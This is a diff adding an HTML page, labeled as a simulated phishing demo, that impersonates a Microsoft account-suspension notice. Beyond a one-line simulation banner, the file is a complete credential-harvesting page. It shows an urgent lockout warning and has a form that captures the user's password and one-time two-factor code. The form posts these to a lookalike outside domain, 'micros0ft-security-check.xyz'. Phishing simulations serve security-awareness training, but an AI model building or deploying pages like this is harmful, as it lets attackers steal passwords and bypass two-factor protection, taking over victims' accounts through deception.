@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Microsoft Account - Suspended Notice (Simulated Phishing Demo)</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #EBF3FB;
+      margin: 0;
+      padding: 40px 20px;
+    }
+    .demo-notice {
+      max-width: 440px;
+      margin: 0 auto 20px;
+      padding: 10px;
+      background: #FFF3CD;
+      border: 1px solid #FFEEBA;
+      border-radius: 6px;
+      color: #856404;
+      font-size: 13px;
+      text-align: center;
+    }
+    .card {
+      max-width: 440px;
+      margin: 0 auto;
+      background: #FFFFFF;
+      padding: 40px;
+      border: 1px solid #D1D5DB;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+      border-radius: 4px;
+    }
+    .logo-text {
+      font-size: 20px;
+      font-weight: 600;
+      color: #262626;
+      margin-bottom: 20px;
+    }
+    .alert-box {
+      background: #FDF2F2;
+      border-left: 4px solid #DC2626;
+      padding: 12px;
+      font-size: 13px;
+      color: #991B1B;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin: 0 0 10px 0;
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      font-size: 13px;
+      margin-bottom: 6px;
+      font-weight: 600;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #666;
+      border-radius: 2px;
+      box-sizing: border-box;
+      font-size: 14px;
+    }
+    .otp-input {
+      letter-spacing: 4px;
+      font-size: 18px;
+      text-align: center;
+      font-weight: bold;
+    }
+    .btn-next {
+      background: #0067B8;
+      color: #FFF;
+      border: none;
+      padding: 10px 24px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      float: right;
+    }
+    .clear {
+      clear: both;
+    }
+  </style>
+</head>
+<body>
+  <div class="demo-notice">
+    <strong>SIMULATION PAGE FOR TESTING:</strong> Demonstrates account suspension notice, urgent verification demand, and two-factor OTP code harvesting.
+  </div>
+
+  <div class="card">
+    <div class="logo-text">Microsoft</div>
+
+    <div class="alert-box">
+      <strong>Account Suspended:</strong> Immediate action required. Your access has been locked due to suspicious login activity. Verify your identity with your two-factor security code immediately.
+    </div>
+
+    <h1>Verify your identity</h1>
+
+    <form action="http://micros0ft-security-check.xyz/verify-otp" method="POST">
+      <div class="form-group">
+        <label for="email">Account Email</label>
+        <input type="text" id="email" name="email" value="alex.turner@example.com" readonly>
+      </div>
+
+      <div class="form-group">
+        <label for="password">Current Password</label>
+        <input type="password" id="password" name="password" placeholder="Enter password" required>
+      </div>
+
+      <div class="form-group">
+        <label for="otp">Enter 6-digit verification code (OTP / 2FA)</label>
+        <input type="text" id="otp" name="otp" class="otp-input" placeholder="000 000" maxlength="6" required>
+      </div>
+
+      <button type="submit" class="btn-next">Verify & Unlock Account</button>
+      <div class="clear"></div>
+    </form>
+  </div>
+</body>
+</html>
